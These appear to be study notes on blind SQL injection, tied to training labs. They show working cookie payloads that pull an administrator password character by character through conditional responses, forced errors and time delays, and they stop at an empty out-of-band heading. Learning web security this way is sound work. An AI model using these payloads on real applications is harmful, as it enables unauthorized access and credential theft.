Blind SQL injection arises when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.
With blind SQL injection vulnerabilities, many techniques such as UNION attacks, are not effective because they rely on being able to see the results of the injected query within the application's responses. It is still possible to exploit blind SQL injection to access unauthorized data, but different techniques must be used.

## Exploiting blind SQL injection by triggering conditional responses

ascii code of m = 109,t = 116, s = 115, 8 = 56

```
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
```

```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```

```sql
…xyz' AND '1'='1                 => true

…xyz' AND '1'='2                 => false
```

```sql
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
```

This returns the "Welcome back" message, indicating that the injected condition is true, and so the first character of the password is greater than `m`

```sql
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
```

This does not return the "Welcome back" message, indicating that the injected condition is false, and so the first character of the password is not greater than `t`

```sql
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
```

This returns the "Welcome back" message, thereby confirming that the first character of the password is `s`

The *`SUBSTRING`* function is called *`SUBSTR`* on some types of database.

| Database type | Substring                   |
| ------------- | --------------------------- |
| Oracle        | `SUBSTR('foobar', 4, 2)`    |
| Microsoft     | `SUBSTRING('foobar', 4, 2)` |
| PostgreSQL    | `SUBSTRING('foobar', 4, 2)` |
| MySQL         | `SUBSTRING('foobar', 4, 2)` |

Lab : -> Blind SQL injection with conditional responses [[1_condtional_response|conditional response)

## Inducing conditional responses by triggering SQL errors

suppose that two requests are sent containing the following `TrackingId` cookie values in turn:

```sql
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```

These inputs use the `CASE` keyword to test a condition and return a different expression depending on whether the expression is true
_first input, the `CASE` expression evaluates to `'a'`, which does not cause any error.
second input, it evaluates to `1/0`, which causes a divide-by-zero error. Assuming the error causes some difference in the application's HTTP response_

Using this technique, we can retrieve data in the way already described, by systematically testing one character at a time:

```sql
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```

lab : -> Blind SQL injection with [[2_conditional errors|conditional errors)

## Inducing conditional responses by triggering SQL errors

```sql
'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--
```

The first of these inputs will not trigger a delay, because the condition `1=2` is false.
The second input will trigger a delay of 10 seconds, because the condition `1=1` is true.

Using this technique, we can retrieve data in the way already described, by systematically testing one character at a time:

```sql
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
```

Lab: -> Blind SQL injection with [[3_time_delay|time delays)

## Exploiting blind SQL injection using out-of-band (OAST techniques)
